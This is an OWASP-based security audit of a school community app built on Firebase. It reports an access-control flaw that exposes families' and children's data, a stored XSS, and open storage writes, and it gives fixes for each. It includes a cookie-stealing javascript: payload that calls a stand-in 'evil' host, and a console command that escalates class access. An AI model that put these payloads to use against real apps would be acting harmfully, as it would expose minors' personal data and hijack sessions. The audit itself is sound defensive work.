# Security Review — קהילת שחף (shachaf)

**Date:** 2026-07-02
**Reviewer:** Web Application Security Architect (OWASP-based audit)
**Scope:** React 19 + Firebase PWA, deployed on Vercel (shachaf.vercel.app)
**Stack:** Firebase Auth (Google + email/password), Firestore, Firebase Storage, one Vercel serverless function (`api/chat.js`, Gemini proxy)
**Threat model:** Authenticated community app for a school. Every user is an authenticated, semi-trusted member (parents, host families, community members) plus privileged roles (`admin`, `super_admin`, class admins). The primary adversary is a **logged-in, low-privilege member** abusing client trust, plus the usual anonymous web attacker. Data sensitivity is moderate-to-high: it concerns **children**, home addresses, phone numbers, and emails.

Ruleset: `~/.claude/security-rules.md` (OWASP Top 10 2021, API Security Top 10 2023, LLM Top 10 2025).

---

## Executive Summary

The application is, on the whole, **deliberately and competently secured**. Server-side enforcement lives entirely in `firestore.rules` and `storage.rules` (there is no trusted backend besides the Gemini proxy), and those rules are unusually thorough for a project this size: field-level `diff().affectedKeys().hasOnly(...)` guards, size caps on free-text fields, fail-closed AI usage metering, role-change prevention on self-update, and a default `deny` at the bottom of both rulesets. The AI proxy verifies Firebase ID tokens, rate-limits per-minute and per-day, caps message size and count, and never ships the Gemini key to the client. No secrets are bundled into the client (only the expected public Firebase config). No `dangerouslySetInnerHTML` anywhere.

However, there are **two high-impact findings** that undermine the access-control model and one **stored-XSS** vector:

1. **CRITICAL — Client-controlled `classIds` enables cross-class data access (privilege escalation / IDOR).** The "same-class" read rules for `/users` and `/children` trust `users/{uid}.classIds`, but that field is writable by the user themselves (the self-update rule only blocks `role`/`roles`). A member can set their own `classIds` to any class and read every family's profile and every child in that class — names, phones, addresses, and child records.
2. **HIGH — Stored XSS via member-contributed group links (`javascript:` URLs).** `groupLinks.url` is rendered straight into `<a href>` with no scheme validation; the Firestore rule only checks length. Any group member can plant a `javascript:` link that runs in another member's session.
3. **HIGH — Storage `feedback/` and `businesses/` write paths have no ownership or identity gate.** Any authenticated user can write arbitrary image blobs to these prefixes and (for feedback) overwrite others' screenshots, at 10 MB each — a storage-cost / integrity abuse vector.

Medium and low findings (CSP hardening, class-admin over-broad reads, missing input validation at several write boundaries, `view-as` being cosmetic-only) are listed below. None of the rules are catastrophically open — the default-deny and role checks hold — but the `classIds` trust issue is a genuine data-exposure bug that should be fixed before any wider launch, given the app holds children's data.

**Fix now:** Findings 1, 2, 3.
**Fix soon:** 4–8.
**Backlog:** 9–13.

---

## Findings Table

| # | Severity | Rule | Location | Description |
|---|----------|------|----------|-------------|
| 1 | **CRITICAL** | A01 Broken Access Control / IDOR | `firestore.rules:14-18, 30-33, 190-201`; `src/lib/db.js:361-365` | Self-writable `classIds` grants cross-class read of all users' profiles and all children. |
| 2 | **HIGH** | A03 Injection / XSS | `src/pages/family/CommunityGroupsPage.jsx:179`; `firestore.rules:303-310` | `groupLinks.url` rendered in `href` with no scheme filter → stored `javascript:` XSS. |
| 3 | **HIGH** | A01 / A05 Misconfiguration | `storage.rules:66-73, 76-81` | `feedback/` and `businesses/` writes lack owner/identity checks; anyone can write/overwrite blobs. |
| 4 | **MEDIUM** | A01 Broken Access Control | `firestore.rules:25-27` | Any user with `classAdminFor` set is globally readable including phone/email/address (contact directory), but nothing validates who gets `classAdminFor`. |
| 5 | **MEDIUM** | A05 Security Headers | `vercel.json:12` | CSP allows `style-src 'unsafe-inline'`, broad `img-src https:`, `https://*.firebaseapp.com` in `script-src`; no `object-src`/`base-uri`. |
| 6 | **MEDIUM** | A04 Insecure Design | `firestore.rules` (multiple write rules) | Several writable collections lack type/length validation on user-supplied fields (events, businesses `website`, groupLinks `url`, children `hobbies`/`pet`). |
| 7 | **MEDIUM** | A01 / privilege | `firestore.rules:190-213`; onboarding self-claim | Any authenticated user can read every **unlinked** child (`parentUids == []`) and self-claim it, with no email/name match. |
| 8 | **MEDIUM** | A07 Auth / session | `src/context/AuthContext.jsx:24-35, 194-196` | `view-as` role and `role`-derived UI are client-only; gating relies on rules holding (they mostly do), but any admin-scoped data fetched into a page is exposed if a rule is ever loosened. |
| 9 | **LOW** | A09 Logging | `api/chat.js`; client | No audit trail of privileged actions (role changes, approvals, deletes); makes abuse of #1/#4 hard to detect. |
| 10 | **LOW** | A03 XSS defense-in-depth | `src/pages/family/BusinessDirectoryPage.jsx:220` | `biz.website` prepends `https://` when not `http`-prefixed — currently neutralizes `javascript:`, but fragile; one refactor away from a hole. |
| 11 | **LOW** | Privacy / GDPR (minors) | `firestore.rules:191-201`, roster pages | Children's names + parents' phone/address broadly readable within a class; no data-minimization or consent gating documented. |
| 12 | **LOW** | A04 Rate limiting | `api/chat.js:7-17` | Per-minute limiter is in-memory per serverless instance; resets on cold start / scales per-instance. Daily Firestore limit is the real control (good), but the minute limit is effectively best-effort. |
| 13 | **LOW** | A05 CORS | `api/chat.js:64-69` | Single-origin allowlist is correct; note it hard-codes prod origin, so preview deploys can't call the API (functional, not a vuln — flagged for awareness). |

---

## Detailed Findings

### 1. CRITICAL — Client-controlled `classIds` enables cross-class data access
**Rule:** A01 Broken Access Control / IDOR
**Location:** `firestore.rules:14-18` (users same-class read), `firestore.rules:30-33` (class-admin member read), `firestore.rules:190-201` (children same-class read); write path `src/lib/db.js:361-365` (`syncUserClassIds`), self-update rule `firestore.rules:40-43`.

**Issue:** Multiple read rules grant access based on the requester's own `users/{uid}.classIds`:

```
// users – same-class parents can read each other
allow read: if request.auth != null
  && resource.data.get('classIds', []).hasAny(
       get(.../users/$(request.auth.uid)).data.get('classIds', []));
// children – same-class read
|| resource.data.get('classId','') in get(.../users/$(request.auth.uid)).data.get('classIds', [])
```

But the self-update rule only prevents changing `role` and `roles`:

```
allow update: if ... request.auth.uid == userId
  && request.resource.data.role == resource.data.role
  && request.resource.data.get('roles', []) == resource.data.get('roles', []);
```

`classIds` is therefore fully user-writable. It is set client-side by `syncUserClassIds()` (`db.js:364`) using a plain `updateDoc`, confirming it is not a trusted/server-derived field.

**Exploit scenario:** A logged-in community member opens the console and runs:
```js
updateDoc(doc(db,'users',myUid), { classIds: ['class-A','class-B','class-C', ...allClassIds] })
```
Now every read rule that keys off `classIds` passes. They can enumerate `/users` and `/children` and read **every family's name, phone, email, home address, and every child's record** across all classes — exactly the sensitive, minor-related data this app exists to protect. This is a full horizontal-and-slightly-vertical break of the roster access model.

**Fix:** `classIds` must be a trusted, server-derived field, not self-writable. Options, in order of robustness:
- **Best:** Derive class membership on the server. Move `syncUserClassIds` into a Cloud Function (or the existing Vercel function with Admin SDK) that recomputes `classIds` from the `children` the user is actually a parent of, and block client writes to `classIds` in rules.
- **Rule-only mitigation (no backend change):** In the self-update rule, also freeze `classIds`:
  ```
  && request.resource.data.get('classIds', []) == resource.data.get('classIds', [])
  ```
  Then have membership changes flow only through the child-link write paths (which already run `syncUserClassIds`) — but note those still `updateDoc` `classIds` directly as the user, so you must instead validate in the rule that any added `classId` matches a class the user has a linked child in. A pure-rules version is: on update, require that the new `classIds` is a subset of the class IDs of children where the user is in `parentUids`. This is expensive in rules (per-child `get`s) and hard to generalize, which is why the Cloud Function is preferred.

**Verification:** As a non-admin test user, attempt to (a) set `classIds` to a class you have no child in and (b) then read a `/children` doc in that class. Both must fail with `permission-denied`. Add an emulator rules-test asserting this.

---

### 2. HIGH — Stored XSS via member-contributed group links
**Rule:** A03 Injection (XSS, stored, DOM sink)
**Location:** `src/pages/family/CommunityGroupsPage.jsx:179`; also `groupLinks` field `f.value`/`fileUrl` usages in `GroupPage.jsx`. Rule: `firestore.rules:303-310`.

**Issue:** Group members can post links stored in `groupLinks/{id}.url`. The rule validates only `url.size() <= 2000` — no scheme check. The client renders it directly:
```jsx
<a href={l.url} target="_blank" rel="noopener noreferrer">…</a>
```
A `javascript:` (or `data:text/html`) URL in `href` executes on click.

**Exploit scenario:** A member of any hobby group creates a link with
`url = "javascript:fetch('https://evil/x?c='+document.cookie)"` and an innocuous `label`. Any other member who clicks it runs attacker JS in their authenticated origin — able to read/modify the victim's Firestore data within their permissions, exfiltrate the Firebase ID token from IndexedDB, etc. Because it's stored and community-visible, it self-propagates to whoever opens the group.

**Fix:** Validate scheme at the trust boundary **and** at render:
- Client render guard (defense that ships immediately):
  ```jsx
  function safeHref(u) {
    try { const p = new URL(u, window.location.origin).protocol;
      return ['http:','https:','mailto:','tel:'].includes(p) ? u : '#'; }
    catch { return '#'; }
  }
  <a href={safeHref(l.url)} …>
  ```
  Apply the same to `msg.fileUrl`, `f.value`, `m.fileUrl` in `GroupPage.jsx` (these are Firebase Storage download URLs today, but they're user-associated fields and should still be gated).
- Rule guard: require `url.matches('^https?://.*')` in the `groupLinks` create rule.

**Verification:** Create a group link with `javascript:alert(1)`; confirm it renders as inert (`href="#"`) and that the create is rejected by the rule.

---

### 3. HIGH — Storage `feedback/` and `businesses/` writes lack ownership checks
**Rule:** A01 Broken Access Control / A05 Misconfiguration
**Location:** `storage.rules:66-73` (feedback), `storage.rules:76-81` (businesses).

**Issue:** Both paths allow write to any authenticated user with only size (10 MB) and content-type (`image/.*`) checks — no tie to the uploader's uid or to an owning Firestore doc:
```
match /feedback/{fileName} {
  allow write: if request.auth != null
    && request.resource.size < 10*1024*1024
    && request.resource.contentType.matches('image/.*');   // no owner check
}
match /businesses/{fileName} {
  allow write: if request.auth != null && <size> && <type>; // no owner check
}
```
Unlike `feedback` Firestore docs (which correctly require the doc to belong to the submitter), the Storage rule doesn't reference the doc at all. Filenames are attacker-chosen, so one user can **overwrite another user's** feedback screenshot or business image, and can upload unlimited junk blobs.

**Exploit scenario:** Any member scripts repeated 10 MB uploads to `feedback/<random>.png` to run up storage/egress costs, or overwrites `businesses/<victimBiz>.png` to deface another member's listing (integrity), or uploads content and links it elsewhere (hosting abuse). `image/*` content-type is client-asserted and can be spoofed.

**Fix:**
- Namespace by uid and enforce it: `match /feedback/{uid}/{fileName}` with `allow write: if request.auth.uid == uid && …`. Same for `businesses/{uid}/{fileName}` — the create/update Firestore rules already bind `communityBusinesses.uid == request.auth.uid`, so mirror that in Storage.
- Alternatively gate on the owning Firestore doc via `firestore.get(...)` as the other Storage paths already do (see `events`, `children`, `classes`, `community`).
- Consider tightening size (screenshots rarely need 10 MB) and validating extension server-side (the client `safeExt` allowlist in `db.js:12-16` is good but client-side only).

**Verification:** As user A, attempt to write `feedback/somefile.png` and to overwrite an existing object created by user B; both must be denied unless the path/owner matches A.

---

### 4. MEDIUM — Class admins are globally readable, but assignment of `classAdminFor` is unvalidated
**Rule:** A01 Broken Access Control
**Location:** `firestore.rules:25-27`.

**Issue:** `allow read: if resource.data.get('classAdminFor', []).size() > 0` makes any user who has a non-empty `classAdminFor` **publicly readable to every authenticated user** (by design — "community contact directory"), exposing their phone/email/address. That is acceptable *if and only if* `classAdminFor` is trustworthy. But like `classIds`, `classAdminFor` is only frozen against self-edit in the users self-update rule via `role`/`roles`? No — the self-update rule does **not** mention `classAdminFor`, so a user can add `classAdminFor` to themselves. That doesn't grant admin power (write rules check `classAdminFor` via `get()` of their own doc → so a self-set `classAdminFor` **does** grant class-admin write/read powers on events, children, classes, and member `status` updates).

**Exploit scenario:** A member sets `classAdminFor: ['class-A']` on their own profile. They now satisfy every rule that reads `classAdminFor` from their own user doc: they can write `children` in class A (`firestore.rules:202-205`), approve/deny members' `status`, create class-scoped events, and read the class roster. This is a **vertical privilege escalation** to class-admin.

**Fix:** Freeze `classAdminFor` (and `classIds`, per #1) in the self-update rule — only admins/super_admins may set it:
```
allow update: if request.auth.uid == userId
  && request.resource.data.role == resource.data.role
  && request.resource.data.get('roles', []) == resource.data.get('roles', [])
  && request.resource.data.get('classAdminFor', []) == resource.data.get('classAdminFor', [])
  && request.resource.data.get('classIds', []) == resource.data.get('classIds', []);
```
This single change closes the escalation surface behind both #1 and #4. (This is the highest-leverage fix in the report — arguably promote to CRITICAL alongside #1.)

**Verification:** As a non-admin, set `classAdminFor` on your own user doc; must be denied. Then confirm you cannot write a `children` doc or approve a member.

---

### 5. MEDIUM — CSP hardening
**Rule:** A05 Security Misconfiguration (headers)
**Location:** `vercel.json:12`.

Current CSP is a solid baseline (no `'unsafe-inline'`/`'unsafe-eval'` in `script-src`, `frame-ancestors 'none'`, HSTS present). Gaps:
- `style-src 'unsafe-inline'` — required by Tailwind/inline styles today; acceptable but weakens protection against injected style-based attacks. Track for nonce/hash migration.
- `script-src` includes `https://*.firebaseapp.com` — broad; scope to the exact auth handler domain if possible.
- `img-src 'self' data: https:` — `https:` allows loading images from any host (SSRF-ish beaconing / tracking). Narrow to Firebase Storage + googleusercontent domains.
- Missing `object-src 'none'` and `base-uri 'self'` — cheap additions that block plugin and `<base>` hijack vectors.

**Fix (illustrative):**
```
default-src 'self';
script-src 'self' https://apis.google.com;
connect-src 'self' https://*.googleapis.com https://*.firebaseio.com https://identitytoolkit.googleapis.com https://securetoken.googleapis.com wss://*.firebaseio.com;
img-src 'self' data: https://*.googleusercontent.com https://firebasestorage.googleapis.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
frame-src https://accounts.google.com https://*.firebaseapp.com;
frame-ancestors 'none'; object-src 'none'; base-uri 'self';
```
**Verification:** Load the app, confirm Google sign-in still works, and check the console for CSP violations; run against securityheaders.com.

---

### 6. MEDIUM — Missing type/length validation on several write boundaries
**Rule:** A04 Insecure Design (input validation at trust boundary)
**Location:** `firestore.rules` — events (`76-116`), `communityBusinesses.website` (`407-417`, no length/type on `website`, `phone`, `email`), `groupLinks.url` (see #2), `children.hobbies`/`pet` (`206-208`, no size cap).

**Issue:** Good validation exists on messages, feedback, childNotes, committee chat (size caps). But events have no length caps on `title`/`description`/`location`, business `website`/`phone`/`email` are unbounded and unvalidated for shape, and child `hobbies`/`pet` free-text is uncapped. Unbounded strings enable storage bloat and are the raw material for stored-XSS if any of them later reach an unsafe sink.

**Fix:** Add `size()` caps and `is string` checks consistently, mirroring the messages/feedback pattern. For URLs and emails, add `matches(...)` shape checks.

**Verification:** Emulator tests submitting oversized/oddly-typed fields must be rejected.

---

### 7. MEDIUM — Any user can read and self-claim unlinked children
**Rule:** A01 Broken Access Control
**Location:** `firestore.rules:199-201` (read unlinked), `firestore.rules:210-213` (claim unlinked).

**Issue:** To support onboarding, `children` with `parentUids == []` are readable by **any** authenticated user, and any user can set `parentUids` to `[themselves]`. There is no match on child name, email, or an invite token.

**Exploit scenario:** A curious member enumerates unlinked children (names, class, hobbies) and can attach themselves as a parent to a child that isn't theirs, then read/update that child and gain that class's `classIds`. Combined with #1 this is another route to roster access, and it's a privacy exposure of minors' data on its own.

**Fix:** Gate onboarding self-claim behind a shared secret the parent must know — e.g., require the claimer's `auth.token.email` to be present in an admin-seeded `allowedParentEmails` array on the child doc, or issue one-time claim tokens during import. At minimum, restrict *read* of unlinked children to a narrow query the onboarding flow needs, not blanket read.

**Verification:** Attempt to read and claim an unlinked child whose invite/email you don't match; must be denied.

---

### 8. MEDIUM — `view-as` and role UI are client-only
**Rule:** A07 Identification & Auth Failures (client-trust)
**Location:** `src/context/AuthContext.jsx:24-35` (`viewAs` from localStorage), `181-196` (role flags), consumed by route guards.

**Issue:** `isAdmin`, `effectiveRole`, `needsOnboarding`, and the `view-as-parent` mode are all derived client-side from `user.role` and a localStorage value. This is fine as UX, but it means **no security boundary exists in the client** — the only real enforcement is Firestore/Storage rules. That's the correct architecture, but it makes findings #1/#4 more damaging: any page that fetches data assuming "the rules will filter it" is only as safe as the rules. Today the rules mostly hold; the risk is a future page that queries a collection expecting role-scoping the rules don't actually provide.

**Fix:** Keep client role logic as cosmetic only (it already is). Document the invariant "every collection read a page performs must be independently authorized by rules" and add rules-emulator tests per collection. Do not add any feature that returns admin-only data to a client based solely on `user.role`.

**Verification:** Set `localStorage.shachaf_view_as = 'admin'` (or edit React state) as a non-admin and confirm no admin data loads — because rules deny it.

---

### 9–13. LOW findings
- **9 (Logging):** No audit log for role changes, member approvals, or deletes. Add an append-only `auditLog` collection (admin-write via Cloud Function) so abuse of #1/#4/#7 is detectable. OWASP A09.
- **10 (Business website href):** `biz.website.startsWith('http') ? biz.website : 'https://'+biz.website` currently defuses `javascript:` (it gets prefixed to `https://javascript:…`, inert). Fragile — apply the `safeHref` helper from #2 for consistency and future-proofing.
- **11 (Minors' privacy / GDPR):** Children's names and parents' phone/address are broadly readable within a class and (for class admins) globally. Document lawful basis/consent, minimize fields returned to rosters, and confirm a data-erasure path exists. Especially relevant because subjects are minors.
- **12 (Rate limiting):** `api/chat.js` per-minute limiter is in-memory per serverless instance and resets on cold start — best-effort only. The Firestore daily limit is the authoritative control (correctly fail-closed). Consider a shared store (Firestore/Upstash) if minute-level limiting matters.
- **13 (CORS/origin):** `APP_ORIGIN` is hard-coded to prod; correct for security but breaks preview deploys calling the API. Awareness only.

---

## Positive Security Findings (done well)

- **Default-deny** at the end of both `firestore.rules` (`425-427`) and `storage.rules` (`84-86`).
- **Role self-escalation blocked** for `role`/`roles` on self-update (`firestore.rules:42-43`); only super_admin can grant super_admin (`51-53`).
- **Field-level write scoping** via `diff().affectedKeys().hasOnly(...)` for RSVPs, committee/group membership, feedback screenshot attach, class-admin `status` approval, child co-parent edits.
- **AI proxy** (`api/chat.js`): verifies Firebase ID token server-side, never exposes `GEMINI_API_KEY` to the client, caps messages to 20 × 2000 chars, fail-closed daily metering, per-minute limiter, strict single-origin CORS, method/content-type checks. Prompt is fixed and role-scoped (LLM Top 10: reasonable excessive-agency containment).
- **No secrets in the client bundle** — only the public Firebase config (expected). Verified against `dist/` and `src/`.
- **No `dangerouslySetInnerHTML`** anywhere in `src/`.
- **Upload extension allowlist** (`db.js:12-16`) blocks `svg/html/js/xml` and normalizes extensions; Storage rules add size + `image/*` content-type caps.
- **Good security headers** in `vercel.json`: HSTS (2y + subdomains), `X-Frame-Options: DENY` + `frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, restrictive `Permissions-Policy`, sane CSP baseline.
- **aiUsage anti-tamper** rule prevents users zeroing their own counter within a day (`firestore.rules:157-166`).

---

## Prioritized Remediation Plan

### Fix now (before wider launch — data exposure of minors)
1. **Freeze `classIds` and `classAdminFor` in the users self-update rule** (Findings #1 + #4). One rule change closes both the cross-class read escalation and the class-admin privilege escalation. Then move `classIds` derivation to a trusted server context (Cloud Function / Admin SDK) so legitimate membership sync still works.
   - File: `firestore.rules:40-43` — add the two `==` guards shown in #4.
   - File: `src/lib/db.js:361-365` — relocate `syncUserClassIds` writes server-side, or drive membership purely through validated child-link paths.
2. **Add `safeHref` URL-scheme guard** at every user-URL render sink, and require `https?://` in the `groupLinks` create rule (Finding #2).
   - Files: `CommunityGroupsPage.jsx:179`, `GroupPage.jsx` (`fileUrl`, `f.value`), `BusinessDirectoryPage.jsx:220`; `firestore.rules:303-310`.
3. **Scope Storage `feedback/` and `businesses/` writes to the uploader's uid** (or the owning Firestore doc), and reduce max size (Finding #3).
   - File: `storage.rules:66-81`.

### Fix soon
4. Gate onboarding unlinked-child read/claim behind an email/token match (Finding #7).
5. Add missing type/length validation to events, business, groupLinks, child free-text (Finding #6).
6. Harden CSP: add `object-src 'none'`, `base-uri 'self'`, narrow `img-src` and `script-src` (Finding #5).

### Backlog
7. Add an append-only audit log for privileged actions (Finding #9).
8. Document minors'-data handling: consent basis, field minimization, erasure path (Finding #11).
9. Move per-minute AI rate limiting to a shared store if needed (Finding #12).
10. Apply `safeHref` to `biz.website` for consistency (Finding #10).

### Recommended test harness
Stand up the Firebase Rules Emulator and add unit tests asserting, for a non-admin user: cannot self-set `classIds`/`classAdminFor`; cannot read another class's `/users` or `/children`; cannot write `children` or approve members without admin/class-admin from a *trusted* source; cannot claim an unlinked child without a match; cannot write to `feedback/`/`businesses/` outside their own namespace. These tests would have caught findings #1, #3, #4, and #7.
